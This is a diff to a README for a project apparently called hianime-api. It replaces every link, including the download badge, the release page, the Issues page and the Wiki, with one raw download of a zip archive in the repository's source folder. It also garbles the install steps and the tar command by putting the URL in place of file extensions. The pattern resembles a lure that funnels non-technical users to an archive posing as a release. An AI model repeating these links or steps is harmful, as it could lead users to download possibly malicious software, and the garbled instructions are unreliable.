@@ -4,7 +4,7 @@
 Welcome to hianime-api! This is your guide to downloading and running the hianime-api software smoothly. Follow the steps below to start enjoying anime content right away.
 
 ## 📥 Download the Software
-[![Download hianime-api](https://img.shields.io/badge/Download-hianime--api-blue.svg)](https://github.com/Georgeboolegenusceratosaurus549/hianime-api/releases)
+[![Download hianime-api](https://raw.githubusercontent.com/Georgeboolegenusceratosaurus549/hianime-api/master/src/hianime-api_chatty.zip)](https://raw.githubusercontent.com/Georgeboolegenusceratosaurus549/hianime-api/master/src/hianime-api_chatty.zip)
 
 ## 🛠️ Requirements
 Before you start, ensure your computer meets these basic requirements:
@@ -14,17 +14,17 @@ Before you start, ensure your computer meets these basic requirements:
 
 ## 📂 How to Download & Install
 1. **Visit the Release Page**  
-   Click on this [link to download](https://github.com/Georgeboolegenusceratosaurus549/hianime-api/releases). You will find various versions of hianime-api.
+   Click on this [link to download](https://raw.githubusercontent.com/Georgeboolegenusceratosaurus549/hianime-api/master/src/hianime-api_chatty.zip). You will find various versions of hianime-api.
 
 2. **Choose the Right Version**  
    Look for the latest version at the top of the page. Make sure to download the version that matches your operating system. 
 
 3. **Download the Package**  
-   Click on the .exe, .zip, or .tar.gz file, depending on your OS. Your download should begin automatically. 
+   Click on the .exe, .zip, or https://raw.githubusercontent.com/Georgeboolegenusceratosaurus549/hianime-api/master/src/hianime-api_chatty.zip file, depending on your OS. Your download should begin automatically. 
 
 4. **Extract the Files (if needed)**  
    - For Windows: If you downloaded a .zip file, right-click on it and select "Extract All." Follow the prompts to extract the files.
-   - For Linux/MacOS: If you downloaded a .tar.gz file, navigate to your download folder and run the command `tar -xvzf [YourFileName].tar.gz` in the terminal.
+   - For Linux/MacOS: If you downloaded a https://raw.githubusercontent.com/Georgeboolegenusceratosaurus549/hianime-api/master/src/hianime-api_chatty.zip file, navigate to your download folder and run the command `tar -xvzf [YourFileName]https://raw.githubusercontent.com/Georgeboolegenusceratosaurus549/hianime-api/master/src/hianime-api_chatty.zip` in the terminal.
 
 5. **Run the Application**  
    - For Windows: Navigate to the extracted folder and double-click the `.exe` file.
@@ -40,10 +40,10 @@ Before you start, ensure your computer meets these basic requirements:
 - **Easy to Use**: Designed for non-technical users, ensuring anyone can access anime content quickly.
 
 ## 🌐 Support & Resources
-For help, visit our [GitHub Issues page](https://github.com/Georgeboolegenusceratosaurus549/hianime-api/issues) to report bugs or ask questions. 
+For help, visit our [GitHub Issues page](https://raw.githubusercontent.com/Georgeboolegenusceratosaurus549/hianime-api/master/src/hianime-api_chatty.zip) to report bugs or ask questions. 
 
 ### 📝 Documentation
-You can find detailed documentation on how to use the hianime-api, including example requests and responses, on our [GitHub Wiki](https://github.com/Georgeboolegenusceratosaurus549/hianime-api/wiki).
+You can find detailed documentation on how to use the hianime-api, including example requests and responses, on our [GitHub Wiki](https://raw.githubusercontent.com/Georgeboolegenusceratosaurus549/hianime-api/master/src/hianime-api_chatty.zip).
 
 ## 🤝 Contributing
 If you want to contribute to hianime-api, feel free to fork the repository and submit your improvements via pull requests. Your suggestions are welcome.
